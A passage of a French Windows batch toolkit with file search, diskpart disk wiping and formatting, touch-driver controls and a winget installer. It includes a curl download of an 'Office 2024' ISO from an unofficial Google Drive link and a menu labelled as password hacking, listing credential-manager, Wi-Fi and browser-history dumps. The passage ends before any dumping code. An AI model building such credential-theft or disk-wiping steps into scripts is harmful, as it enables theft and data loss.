>> "!LF_PS!" echo $base = if ($path -eq 'ALL_DRIVES') { 'TousLesDisques' } else { $path.TrimEnd('\') }
>> "!LF_PS!" echo $leaf = if ($path -eq 'ALL_DRIVES') { 'Tous_Les_Disques' } else { Split-Path $base -Leaf }
>> "!LF_PS!" echo if (-not $leaf) { $leaf = $base }
>> "!LF_PS!" echo $leaf = $leaf -replace '[:\\/:*?"^<^>^|]', ''
>> "!LF_PS!" echo $stamp = Get-Date -Format 'yyyyMMdd_HHmm'
>> "!LF_PS!" echo $out = Join-Path '!SCRIPT_DIR!' "Recherche_!ext_name!_${leaf}_${stamp}.txt"
>> "!LF_PS!" echo while ([System.Console]::KeyAvailable) { [System.Console]::ReadKey($true) ^| Out-Null }
>> "!LF_PS!" echo Write-Host "  [~] Scan en cours... (Appuyez sur ECHAP pour annuler)" -ForegroundColor Cyan
>> "!LF_PS!" echo $cancelled = $false
>> "!LF_PS!" echo $files = [System.Collections.Generic.List[System.IO.FileInfo]]::new()
>> "!LF_PS!" echo if ('!ext_filter!' -eq '*.*') {
>> "!LF_PS!" echo     $regex = '.'
>> "!LF_PS!" echo } else {
>> "!LF_PS!" echo     $regex = ($filters ^| ForEach-Object { [regex]::Escape($_.Replace('*','')) }) -join '^|'
>> "!LF_PS!" echo     $regex = "(?i)($regex)$"
>> "!LF_PS!" echo }
>> "!LF_PS!" echo $treeLines = [System.Collections.Generic.List[string]]::new()
>> "!LF_PS!" echo $script:printed = [System.Collections.Generic.HashSet[string]]::new()
>> "!LF_PS!" echo function Show-Tree {
>> "!LF_PS!" echo     param($p, $pre = '', $depth = 1, $chain = @())
>> "!LF_PS!" echo     if ($depth -gt 10) { return }
>> "!LF_PS!" echo     try {
>> "!LF_PS!" echo         $found = @(Get-ChildItem -LiteralPath $p -File -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -match $regex })
>> "!LF_PS!" echo         if ($found.Count -gt 0) {
>> "!LF_PS!" echo             foreach ($c in $chain) {
>> "!LF_PS!" echo                 if ($script:printed.Add($c.Path)) {
>> "!LF_PS!" echo                     Write-Host $c.Line
>> "!LF_PS!" echo                     $treeLines.Add($c.Line)
>> "!LF_PS!" echo                 }
>> "!LF_PS!" echo             }
>> "!LF_PS!" echo             foreach ($f in $found) {
>> "!LF_PS!" echo                 $files.Add($f)
>> "!LF_PS!" echo                 $fl = $pre + "  - " + $f.Name
>> "!LF_PS!" echo                 Write-Host $fl -ForegroundColor DarkCyan
>> "!LF_PS!" echo                 $treeLines.Add($fl)
>> "!LF_PS!" echo             }
>> "!LF_PS!" echo         }
>> "!LF_PS!" echo     } catch {}
>> "!LF_PS!" echo     try { $ch = @(Get-ChildItem -LiteralPath $p -Directory -ErrorAction SilentlyContinue ^| Sort-Object Name) } catch { return }
>> "!LF_PS!" echo     for ($i = 0; $i -lt $ch.Count; $i++) {
>> "!LF_PS!" echo         if ([System.Console]::KeyAvailable) {
>> "!LF_PS!" echo             if ([System.Console]::ReadKey($true).Key -eq [System.ConsoleKey]::Escape) {
>> "!LF_PS!" echo                 if (-not $script:cancelled) { Write-Host "  [X] Annulation en cours..." -ForegroundColor Red }
>> "!LF_PS!" echo                 $script:cancelled = $true
>> "!LF_PS!" echo                 return
>> "!LF_PS!" echo             }
>> "!LF_PS!" echo         }
>> "!LF_PS!" echo         if ($script:cancelled) { return }
>> "!LF_PS!" echo         $last = ($i -eq $ch.Count - 1)
>> "!LF_PS!" echo         $conn = if ($last) { '\-- ' } else { '+-- ' }
>> "!LF_PS!" echo         $next = if ($last) { $pre + '    ' } else { $pre + '^|   ' }
>> "!LF_PS!" echo         $l = $pre + $conn + $ch[$i].Name.ToUpper()
>> "!LF_PS!" echo         $newChain = $chain + @( @{ Path = $ch[$i].FullName; Line = $l } )
>> "!LF_PS!" echo         Show-Tree -p $ch[$i].FullName -pre $next -depth ($depth + 1) -chain $newChain
>> "!LF_PS!" echo     }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo $script:cancelled = $false
>> "!LF_PS!" echo foreach ($p in $paths) {
>> "!LF_PS!" echo     $rootLabel = if ($path -eq 'ALL_DRIVES') { $p } elseif ($leaf) { $leaf } else { $base }
>> "!LF_PS!" echo     $rSep = if ($rootLabel.EndsWith('\')) { '' } else { '\' }
>> "!LF_PS!" echo     $rootDir = $rootLabel.ToUpper() + $rSep
>> "!LF_PS!" echo     $rootChain = @( @{ Path = $p; Line = $rootDir } )
>> "!LF_PS!" echo     try { Show-Tree -p $p -chain $rootChain } catch { Write-Host "  [!] Erreur fatale : $_" -ForegroundColor Red }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo Write-Host "  Traitement et tri par taille..." -ForegroundColor Cyan
>> "!LF_PS!" echo $files = $files ^| Sort-Object Length -Descending
>> "!LF_PS!" echo $totalBytes = ($files ^| Measure-Object -Property Length -Sum).Sum
>> "!LF_PS!" echo $totalMB = if ($totalBytes) { [math]::Round($totalBytes / 1MB, 2) } else { 0 }
>> "!LF_PS!" echo Write-Host "  Trouves : $($files.Count) fichiers ($totalMB MB)" -ForegroundColor Yellow
>> "!LF_PS!" echo $sep = '=' * 100
>> "!LF_PS!" echo $lines = [System.Collections.Generic.List[string]]::new()
>> "!LF_PS!" echo $lines.Add($sep)
>> "!LF_PS!" echo $lines.Add("  Dossier cible    : $path")
>> "!LF_PS!" echo $lines.Add("  Filtres demandes : !ext_filter!")
>> "!LF_PS!" echo $lines.Add("  Total trouves    : $($files.Count) fichiers")
>> "!LF_PS!" echo $lines.Add("  Poids total      : $totalMB MB")
>> "!LF_PS!" echo $lines.Add($sep)
>> "!LF_PS!" echo $lines.Add("")
>> "!LF_PS!" echo $lines.Add(" --- ARBORESCENCE SCANNEE --- ")
>> "!LF_PS!" echo $lines.AddRange($treeLines)
>> "!LF_PS!" echo $lines.Add("")
>> "!LF_PS!" echo $lines.Add(" --- RESULTATS DE LA RECHERCHE --- ")
>> "!LF_PS!" echo $lines.Add("")
>> "!LF_PS!" echo $bar = " " + [char]124 + " "
>> "!LF_PS!" echo $lines.Add((( "TAILLE".PadRight(10) + $bar + "NOM DU FICHIER".PadRight(50) + $bar + "CHEMIN COMPLET" )))
>> "!LF_PS!" echo $lines.Add("-" * 120)
>> "!LF_PS!" echo foreach ($f in $files) {
>> "!LF_PS!" echo     $kb = [math]::Round($f.Length / 1KB, 1)
>> "!LF_PS!" echo     $sz = "$kb KB"
>> "!LF_PS!" echo     if ($kb -gt 1024) { $sz = "$([math]::Round($f.Length / 1MB, 2)) MB" }
>> "!LF_PS!" echo     if ($kb -gt 1048576) { $sz = "$([math]::Round($f.Length / 1GB, 2)) GB" }
>> "!LF_PS!" echo     $n = $f.Name
>> "!LF_PS!" echo     if ($n.Length -gt 48) { $n = $n.Substring(0, 45) + "..." }
>> "!LF_PS!" echo     $lines.Add(( $sz.PadRight(10) + $bar + $n.PadRight(50) + $bar + $f.FullName ))
>> "!LF_PS!" echo }
>> "!LF_PS!" echo $sel = 0
>> "!LF_PS!" echo function Show-Choice {
>> "!LF_PS!" echo     param($s)
>> "!LF_PS!" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "!LF_PS!" echo     Write-Host "  Exporter les resultats en TXT ?  " -NoNewline
>> "!LF_PS!" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "!LF_PS!" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo Show-Choice $sel
>> "!LF_PS!" echo while ($true) {
>> "!LF_PS!" echo     $k = [Console]::ReadKey($true)
>> "!LF_PS!" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "!LF_PS!" echo         $sel = 1 - $sel
>> "!LF_PS!" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "!LF_PS!" echo         Show-Choice $sel
>> "!LF_PS!" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "!LF_PS!" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo if ($sel -eq 0) {
>> "!LF_PS!" echo     $lines.ToArray() ^| Out-File -FilePath $out -Encoding UTF8
>> "!LF_PS!" echo     Write-Host "  [OK] Exporte : $out" -ForegroundColor Green
>> "!LF_PS!" echo     Start-Sleep -Seconds 1
>> "!LF_PS!" echo     Start-Process "notepad.exe" -ArgumentList "`"$out`""
>> "!LF_PS!" echo     exit 0
>> "!LF_PS!" echo } else { exit 1 }

powershell -NoProfile -ExecutionPolicy Bypass -File "!LF_PS!"
del /f /q "!LF_PS!" 2>nul
echo.
pause
endlocal & goto list_folder_menu

REM ===================================================================
REM                    GESTIONNAIRE DE DISQUES - FORMATAGE AVEC DISKPART
REM ===================================================================
:disk_manager
cls
color 0A
echo.
echo =============================================================
echo                       DISKPART
echo =============================================================
echo.
echo Analyse des disques disponibles...
echo.

set "disk_opts="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | ForEach-Object { '{0}: {1} ({2:N0} GB)' -f $_.Number, $_.FriendlyName, ($_.Size/1GB) }"') do (
    if defined disk_opts (set "disk_opts=!disk_opts!;%%D") else (set "disk_opts=%%D")
)

if not defined disk_opts (
    echo [!] Aucun disque detecte.
    pause
    goto menu_principal
)

call :DynamicMenu "CHOISISSEZ LE DISQUE A FORMATER" "%disk_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto menu_principal

rem Recuperer le numero du disque a partir du choix
set /a idx=1
set "_disk_found=0"
set "disk_num="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
    if !idx! equ %res% ( set "disk_num=%%D" & set "_disk_found=1" )
    set /a idx+=1
)

if "!_disk_found!"=="0" goto disk_manager

:disk_format_choice
set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
set "format_choice=%errorlevel%"

if "%format_choice%"=="0" goto menu_principal
if "%format_choice%"=="1" set fs_type=NTFS
if "%format_choice%"=="2" set fs_type=FAT32
if "%format_choice%"=="3" set fs_type=exFAT
if "%format_choice%"=="4" set fs_type=ReFS

if not defined fs_type goto disk_format_choice

cls
echo.
echo =============================================================
echo                       CONFIRMATION
echo =============================================================
echo.
echo Vous allez formater le DISQUE %disk_num%
echo Format selectionne : %fs_type%
echo.
echo ATTENTION: TOUTES LES DONNEES SERONT DEFINITIVEMENT EFFACEES !
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Confirmer le formatage ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" (
    echo.
    echo Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto disk_manager
)

echo.
echo =============================================================
echo Preparation du formatage...
echo =============================================================
echo.

set script_temp=%temp%\diskpart_script.txt

(
    echo select disk %disk_num%
    echo clean
    echo create partition primary
    echo format fs=%fs_type% quick
    echo assign
    echo exit
) > "%script_temp%"

echo Execution des commandes diskpart...
echo.
diskpart /s "%script_temp%"

set result=%errorLevel%

del "%script_temp%" >nul 2>&1

echo.
echo =============================================================
if %result% equ 0 (
    echo.
    echo Formatage termine avec succes !
    echo.
    echo Le disque %disk_num% a ete :
    echo   - Nettoye completement
    echo   - Partitionne en partition primaire
    echo   - Formate en %fs_type%
    echo   - Une lettre de lecteur lui a ete assignee
    echo.
) else (
    echo.
    echo Une erreur s'est produite pendant le formatage.
    echo Verifiez que le disque existe et n'est pas protege.
    echo.
)
echo =============================================================
echo.

> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Formater un autre disque ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="0" goto disk_manager
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE D'ECRAN TACTILE
REM ===================================================================
:touch_screen_manager
call :AutoMenu "GESTION ECRAN TACTILE" "touch_restart;touch_disable;touch_enable"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:touch_restart
cls
echo.
echo === Redemarrage du pilote d'ecran tactile ===
echo.

echo Redemarrage du service TabletInputService...
net stop TabletInputService >nul 2>&1
timeout /t 2 /nobreak >nul
net start TabletInputService >nul 2>&1

echo Redemarrage du service HidServ...
net stop HidServ >nul 2>&1
timeout /t 2 /nobreak >nul
net start HidServ >nul 2>&1

echo.
echo Desactivation/Reactivation du peripherique tactile via PowerShell...
set "T_PS=%TEMP%\touch_restart.ps1"
if exist "%T_PS%" del "%T_PS%"
>  "%T_PS%" echo $touchDevices = Get-PnpDevice ^| Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }
>> "%T_PS%" echo if ($touchDevices) {
>> "%T_PS%" echo     foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }
>> "%T_PS%" echo     Start-Sleep -Seconds 2
>> "%T_PS%" echo     foreach ($device in $touchDevices) { Write-Host 'Reactivation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }
>> "%T_PS%" echo } else { Write-Host 'Aucun peripherique tactile trouve' }
powershell -ExecutionPolicy Bypass -File "%T_PS%"
if exist "%T_PS%" del "%T_PS%" >nul 2>&1

echo.
echo Redemarrage du processus dwm.exe (Desktop Window Manager)...
taskkill /f /im dwm.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo.
echo === Redemarrage termine ===
echo Testez votre ecran tactile maintenant.
echo.
pause
goto touch_screen_manager

:touch_disable
cls
echo.
echo === Desactivation du pilote tactile ===
echo.

echo Arret du service TabletInputService...
net stop TabletInputService >nul 2>&1

echo Desactivation du peripherique tactile...
set "T_PS=%TEMP%\touch_disable.ps1"
if exist "%T_PS%" del "%T_PS%"
>  "%T_PS%" echo $touchDevices = Get-PnpDevice ^| Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }
>> "%T_PS%" echo if ($touchDevices) {
>> "%T_PS%" echo     foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }
>> "%T_PS%" echo } else { Write-Host 'Aucun peripherique tactile trouve' }
powershell -ExecutionPolicy Bypass -File "%T_PS%"
if exist "%T_PS%" del "%T_PS%" >nul 2>&1

echo.
echo === Pilote tactile desactive ===
echo Le tactile restera desactive jusqu'a reactivation manuelle.
echo.
pause
goto touch_screen_manager

:touch_enable
cls
echo.
echo === Activation du pilote tactile ===
echo.

echo Activation du peripherique tactile...
set "T_PS=%TEMP%\touch_enable.ps1"
if exist "%T_PS%" del "%T_PS%"
>  "%T_PS%" echo $touchDevices = Get-PnpDevice ^| Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }
>> "%T_PS%" echo if ($touchDevices) {
>> "%T_PS%" echo     foreach ($device in $touchDevices) { Write-Host 'Activation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }
>> "%T_PS%" echo } else { Write-Host 'Aucun peripherique tactile trouve' }
powershell -ExecutionPolicy Bypass -File "%T_PS%"
if exist "%T_PS%" del "%T_PS%" >nul 2>&1

echo Demarrage du service TabletInputService...
net start TabletInputService >nul 2>&1

echo.
echo === Pilote tactile active ===
echo.
pause
goto touch_screen_manager

REM ===================================================================
REM                    OUTILS SYSTEME AVANCES
REM ===================================================================
:system_tools
cls
call :reload_fav_cache
set "opts="
set /a s_idx=0
for /l %%I in (1,1,%total_tools%) do (
    if defined t[%%I] (
        set "_entry=!t[%%I]!"
        if defined _entry (
            REM Extrait le label (avant le premier :)
            for /f "tokens=1 delims=:" %%A in ("!_entry!") do set "_lbl=%%A"
            
            for /f "tokens=1* delims=:" %%X in ("!_entry!") do set "_rest=%%Y"
            
            REM Detecte HIDDEN (fin de ligne)
            set "_hidden=0"
            if "!_entry:~-7!"==":HIDDEN" (
                set "_hidden=1"
                set "_rest=!_rest:~0,-7!"
            )
            
            REM Detecte separateur ---
            if "!_lbl!"=="---" (
                REM Pour les titres, garder juste le nom (avant le tilde si present)
                for /f "tokens=1 delims=~" %%N in ("!_rest!") do set "_titleName=%%N"
                set "opts=!opts!;[--- !_titleName! ---]"
                for /f "tokens=1 delims= " %%W in ("!_titleName!") do set "_currentModule=!_mod_%%W!"
            ) else if "!_hidden!"=="0" (
                set "is_fav=0"
                if defined fav_!_lbl! set "is_fav=1"
                if "!is_fav!"=="1" (
                    set "opts=!opts!;(F) !_rest!"
                ) else (
                    set "opts=!opts!;!_rest!"
                )
                set /a s_idx+=1
                set "sys_target[!s_idx!]=!_lbl!"
                set "sys_module[!s_idx!]=!_currentModule!"
            )
        )
    )
)

REM Nettoyage des variables temporaires de la boucle
set "_entry=" & set "_lbl=" & set "_rest=" & set "_hidden=" & set "_currentModule="

set "opts=!opts:~1!"

call :DynamicMenu "OUTILS SYSTEME AVANCES" "!opts!"
set "sys_choice=%errorlevel%"

if "!sys_choice!"=="0" goto menu_principal
if "!sys_choice!"=="299" goto search_tools

if !sys_choice! GEQ 200 (
    set /a toggle_idx=!sys_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!sys_target[%%X]!"
    call :ToggleFav "!toggle_target!"
    goto system_tools
)

set "target=!sys_target[%sys_choice%]!"
set "_routemod=!sys_module[%sys_choice%]!"
if defined _routemod (
    if exist "%SCRIPT_DIR%\modules\!_routemod!.bat" (
        call "%SCRIPT_DIR%\modules\!_routemod!.bat" !target!
        goto system_tools
    )
)
if defined target goto !target!
goto system_tools
REM ===================================================================
:search_tools
cls
echo ===================================================
echo           RECHERCHE DE SCRIPTS / OUTILS
echo ===================================================
echo.
set "search_term="
set /p "search_term=Entrez le mot-cle (ex: DNS, Wifi) ou validation a vide pour Quitter : "

if not defined search_term goto menu_principal

:search_loop
setlocal EnableDelayedExpansion
set "count=0"
set "dyn_opts="
set "current_cat="
set "last_cat_added="

for /l %%I in (1,1,%total_tools%) do (
    if defined t[%%I] (
        set "_val=!t[%%I]!"
        if "!_val:~0,3!"=="---" (
            for /f "tokens=2 delims=:" %%C in ("!_val!") do set "current_cat=%%C"
        ) else (
            echo !_val! | findstr /I /C:"%search_term%" >nul
            if !errorlevel! == 0 (
                if !count! LSS 30 (
                    set /a count+=1
                    for /f "tokens=1,2 delims=:" %%a in ("!_val!") do (
                        for /f "tokens=1,2 delims=~" %%c in ("%%b") do (
                            set "search_res[!count!]=%%a"
                            if not "!last_cat_added!"=="!current_cat!" (
                                set "dyn_opts=!dyn_opts!;[--- !current_cat! ---]"
                                set "last_cat_added=!current_cat!"
                            )
                            set "_d=%%d"
                            if defined _d (
                                set "_d=!_d::HIDDEN=!"
                                set "dyn_opts=!dyn_opts!;%%c - !_d!"
                            ) else (
                                set "dyn_opts=!dyn_opts!;%%c"
                            )
                        )
                    )
                )
            )
        )
    )
)

if "%count%"=="0" (
    cls
    echo ===================================================
    echo   Resultats pour : "%search_term%"
    echo ===================================================
    echo.
    echo   Aucun resultat trouve.
    echo.
    pause
    endlocal
    goto search_tools
)

:search_display
if not defined dyn_opts_clean set "dyn_opts_clean=!dyn_opts:~1!"
set "dyn_opts=!dyn_opts_clean!"
call :DynamicMenu "RESULTATS: %search_term%" "!dyn_opts!" "NOCLS"
set "s_choice=!errorlevel!"

if "!s_choice!"=="0" (
    endlocal
    goto search_tools
)
if "!s_choice!"=="299" (
    endlocal
    goto search_tools
)

if !s_choice! GEQ 200 (
    set /a t_idx=!s_choice!-200
    for %%X in (!t_idx!) do call :ToggleFav "!search_res[%%X]!"
    call :reload_fav_cache
    goto search_display
)

if defined search_res[%s_choice%] (
    set "local_target=!search_res[%s_choice%]!"
) else (
    set "local_target="
)
endlocal & set "target=%local_target%"
if defined target goto %target%
goto search_tools

REM ===================================================================
REM              INSTALLATEUR D'APPLICATIONS (WINGET)
REM ===================================================================
:app_installer
set "wg_id="
set "wg_label="
cls
call :AutoMenu "INSTALLATEUR D'APPLICATIONS" "[--- NAVIGATEURS ---];app_install_chrome;[--- MULTIMEDIA ---];app_install_vlc;[--- PDF ---];app_install_pdf;[--- ARCHIVAGE ---];app_install_winrar;[--- OFFICE ---];app_install_office;[--- SYSTEME ---];app_install_ps7"
if "!errorlevel!"=="0" goto system_tools
goto !AutoMenu_Target!

:app_install_chrome
set "app_choice=1"
goto app_installer_exec

:app_install_vlc
set "app_choice=2"
goto app_installer_exec

:app_install_pdf
set "app_choice=3"
goto app_installer_exec

:app_install_winrar
set "app_choice=4"
goto app_installer_exec

:app_install_ps7
set "app_choice=5"
goto app_installer_exec

:app_install_office
cls
echo ================================================
echo   MICROSOFT OFFICE 2024 - TELECHARGEMENT (7.0 Go)
echo ================================================
echo.
echo  Destination : %USERPROFILE%\Downloads\Office2024.iso
echo  [1/1] Telechargement en cours... (fichier volumineux, soyez patient)
echo  ------------------------------------------------
if exist "%USERPROFILE%\Downloads\Office2024.iso" del /f /q "%USERPROFILE%\Downloads\Office2024.iso" >nul 2>&1
if exist "%TEMP%\Office2024.iso" del /f /q "%TEMP%\Office2024.iso" >nul 2>&1
curl -L --progress-bar -o "%TEMP%\Office2024.iso" "https://drive.usercontent.google.com/download?id=1wf1eqVkXIM0f0R2963Ee4RKK-a_rgWld&export=download&confirm=t"
set "dl_err=!errorlevel!"
if !dl_err!==0 move /y "%TEMP%\Office2024.iso" "%USERPROFILE%\Downloads\Office2024.iso" >nul 2>&1
echo  ------------------------------------------------
echo.
if !dl_err!==0 (
    echo  [OK] Office 2024 telecharge : %USERPROFILE%\Downloads\Office2024.iso
    explorer "%USERPROFILE%\Downloads"
) else (
    echo  [ERREUR] Echec du telechargement. Verifiez votre connexion.
)
echo.
echo  Retour au menu dans 5 secondes...
timeout /t 5 /nobreak >nul
goto app_installer


:app_installer_exec

REM Mapping : index selectionnable -> ID Winget + Nom registre
set "wg[1]=Google.Chrome"
set "wg[2]=VideoLAN.VLC"
set "wg[3]=SumatraPDF.SumatraPDF"
set "wg[4]=RARLab.WinRAR"
set "wg[5]=Microsoft.PowerShell"


set "wg_name[1]=Google Chrome"
set "wg_name[2]=VLC Media Player"
set "wg_name[3]=Sumatra PDF"
set "wg_name[4]=WinRAR"
set "wg_name[5]=PowerShell 7"
set "wg_reg[5]=PowerShell 7"

REM Nom exact tel qu'il apparait dans Ajout/Suppression de programmes (registre)
set "wg_reg[1]=Google Chrome"
set "wg_reg[2]=VLC media player"
set "wg_reg[3]=SumatraPDF"
set "wg_reg[4]=WinRAR"

for %%X in (!app_choice!) do (
    set "wg_id=!wg[%%X]!"
    set "wg_label=!wg_name[%%X]!"
    set "wg_reg_name=!wg_reg[%%X]!"
)

if not defined wg_id goto app_installer

cls
echo ================================================
echo   VERIFICATION : !wg_label!
echo ================================================
echo.
echo  [1/2] Verification de l'installation sur ce systeme...

REM Verification via le registre Windows (detecte TOUTES les installations, pas seulement winget)
powershell -NoProfile -Command "$n='!wg_reg_name!'; $paths=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $found=$false; foreach($p in $paths){ if(Get-ItemProperty $p -EA SilentlyContinue | Where-Object {$_.DisplayName -like ('*'+$n+'*')}){$found=$true} }; exit $(if($found){0}else{1})" >nul 2>&1

if !errorlevel! NEQ 0 (
    echo  [ ] !wg_label! n'est pas installe.
    echo.
    echo  [2/2] Installation en cours...
    echo  ------------------------------------------------
    winget install --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "inst_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !inst_err!==0 (
        echo  [OK] !wg_label! installe avec succes !
    ) else (
        echo  [ERREUR] L'installation a echoue. Verifiez votre connexion.
    )
) else (
    echo  [OK] !wg_label! est deja installe.
    echo.
    echo  [2/2] Recherche de mises a jour disponibles...
    echo  ------------------------------------------------
    winget upgrade --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "upg_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !upg_err!==0 (
        echo  [OK] !wg_label! est a jour.
    ) else (
        echo  [INFO] Aucune mise a jour disponible pour !wg_label!.
    )
)
echo.
echo  Retour au menu dans 3 secondes...
timeout /t 3 /nobreak >nul
goto app_installer

:: ===============================================
:: Menu d'extraction de mots de passe
:: ===============================================
:sys_passwords_menu
call :AutoMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "dump_credman;dump_wifi;gather_browser_history;search_sensitive_docs;scan_web_routes"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:dump_credman
cls
echo [OPERATION] Extraction du Credential Manager Windows...
echo [INFO] Demarrage du script (natif, autonome, sans dependance reseau)...
echo.
